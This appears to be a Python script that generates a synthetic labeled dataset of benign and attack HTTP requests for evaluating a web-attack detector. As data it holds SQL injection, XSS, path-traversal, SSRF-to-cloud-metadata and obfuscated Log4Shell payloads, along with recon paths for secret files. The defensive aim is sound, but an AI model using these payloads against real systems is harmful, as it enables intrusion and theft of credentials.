"""Generate a labeled dataset: benign traffic vs classic, evasive and recon attacks."""
import csv
import os
import random

from app.features import FEATURES, extract
from app.rules import detect

random.seed(1337)

WORDS = ["laptop", "router", "python", "network", "security", "campus", "lagos", "exam",
         "timetable", "course", "phone", "charger", "notes", "result", "hostel", "library",
         "football", "jollof", "news", "weather"]
BROWSER_UAS = [
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_5) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Safari/605.1.15",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_5 like Mac OS X) AppleWebKit/605.1.15 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Android 14; Mobile; rv:131.0) Gecko/131.0 Firefox/131.0",
]
TOOL_UAS = ["curl/8.5.0", "sqlmap/1.8#stable (https://sqlmap.org)", "Nikto/2.5.0",
            "python-requests/2.31.0", "Wget/1.21.4", "gobuster/3.6",
            "Mozilla/5.0 (compatible; Nmap Scripting Engine)"]
DEV_UAS = ["curl/8.5.0", "python-requests/2.31.0"]  # benign tools exist too


def w():
    return random.choice(WORDS)


def n():
    return random.randint(1, 9999)


def nulls():
    return ",".join(["null"] * random.randint(2, 6))


BENIGN = [
    lambda: ("GET", "/", None),
    lambda: ("GET", "/login", None),
    lambda: ("POST", "/login", None),
    lambda: ("GET", f"/profile?id={n()}", None),
    lambda: ("GET", f"/search?q={w()}", None),
    lambda: ("GET", f"/search?q={w()}+{w()}+{w()}", None),
    lambda: ("GET", f"/static/{w()}.{random.choice(['css', 'js', 'png'])}", None),
    lambda: ("GET", f"/api/items?page={random.randint(1, 50)}&limit={random.choice([10, 20, 50])}", None),
    lambda: ("GET", f"/blog/{w()}-{w()}", None),
    lambda: ("GET", f"/products/{n()}?ref={w()}", None),
    lambda: ("POST", "/comment", None),
    lambda: ("GET", "/search?q=O%27Brien", None),
    lambda: ("GET", f"/search?q=how+to+select+a+{w()}+from+{w()}", None),
    lambda: ("GET", f"/search?q={w()}%26{w()}", None),
    lambda: ("GET", f"/redirect?next=/{w()}", None),
    lambda: ("GET", "/favicon.ico", None),
]

CLASSIC = [
    lambda: ("GET", f"/search?q={n()}%27%20OR%20{n()}={n()}--", None),
    lambda: ("GET", f"/search?q=%27%20UNION%20SELECT%20{nulls()}--", None),
    lambda: ("GET", f"/comment?c=%3Cscript%3Ealert({n()})%3C/script%3E", None),
    lambda: ("GET", "/profile?bio=%3Cimg%20src=x%20onerror=alert(1)%3E", None),
    lambda: ("GET", f"/download?f={'../' * random.randint(2, 6)}etc/passwd", None),
    lambda: ("GET", "/fetch?url=http://169.254.169.254/latest/meta-data/", None),
    lambda: ("GET", "/fetch?url=http://localhost:8080/admin", None),
    lambda: ("GET", "/", "${jndi:ldap://x.example/a}"),
]

EVASIVE = [
    lambda: ("GET", "/search?q=1%27/**/oR/**/%271%27=%271", None),
    lambda: ("GET", f"/item?id={n()}+and+substring(@@version,1,1)=5", None),
    lambda: ("GET", f"/item?id={n()}+order+by+{random.randint(1, 12)}--+-", None),
    lambda: ("GET", "/c?x=%3Cdetails/open/ontoggle=alert(1)%3E", None),
    lambda: ("GET", "/c?x=%3Cinput+autofocus+onfocus=alert(1)%3E", None),
    lambda: ("GET", "/c?x=%3Cbody+onpageshow=alert(1)%3E", None),
    lambda: ("GET", "/download?f=..%c0%af..%c0%afetc/passwd", None),
    lambda: ("GET", "/download?f=%2e%2e%5c%2e%2e%5cboot.ini", None),
    lambda: ("GET", "/fetch?url=http://2130706433/", None),
    lambda: ("GET", "/fetch?url=http://[::1]/admin", None),
    lambda: ("GET", "/fetch?url=http://metadata.google.internal/computeMetadata/v1/", None),
    lambda: ("GET", "/", "${j${::-n}di:ldap://x.example/a}"),
]

RECON_PATHS = ["/.env", "/.git/config", "/wp-login.php", "/phpmyadmin/", "/admin.php",
               "/cgi-bin/test.cgi", "/actuator/env", "/server-status", "/backup.zip",
               "/config.php.bak", "/xmlrpc.php", "/.aws/credentials"]
RECON = [lambda: ("GET", random.choice(RECON_PATHS), None)]

ATTACKS = {"classic": CLASSIC, "evasive": EVASIVE, "recon": RECON}


def make_row(label, category, method, path, ua):
    rec = {"path": path, "ua": ua, "method": method}
    row = {"label": label, "category": category,
           "rules_flag": int(bool(detect(rec))), "path": path, "ua": ua}
    row.update(zip(FEATURES, extract(rec)))
    return row


def build(n_each=3000):
    rows = []
    for _ in range(n_each):
        method, path, ua = random.choice(BENIGN)()
        if ua is None:
            ua = random.choice(DEV_UAS) if random.random() < 0.05 else random.choice(BROWSER_UAS)
        rows.append(make_row(0, "benign", method, path, ua))
    for _ in range(n_each):
        cat = random.choices(["classic", "evasive", "recon"], weights=[0.4, 0.4, 0.2])[0]
        method, path, ua = random.choice(ATTACKS[cat])()
        if ua is None:
            ua = random.choice(TOOL_UAS) if random.random() < 0.6 else random.choice(BROWSER_UAS)
        rows.append(make_row(1, cat, method, path, ua))
    random.shuffle(rows)
    return rows


if __name__ == "__main__":
    rows = build()
    os.makedirs("data", exist_ok=True)
    with open("data/dataset.csv", "w", newline="") as f:
        wr = csv.DictWriter(f, fieldnames=list(rows[0].keys()))
        wr.writeheader()
        wr.writerows(rows)
    print(f"wrote {len(rows)} rows -> data/dataset.csv")
    benign = [r for r in rows if r["label"] == 0]
    print(f"rules false-positive rate on benign: {sum(r['rules_flag'] for r in benign) / len(benign):.1%}")
    for cat in ("classic", "evasive", "recon"):
        sub = [r for r in rows if r["category"] == cat]
        print(f"rules-only detection on {cat}: {sum(r['rules_flag'] for r in sub) / len(sub):.1%}")
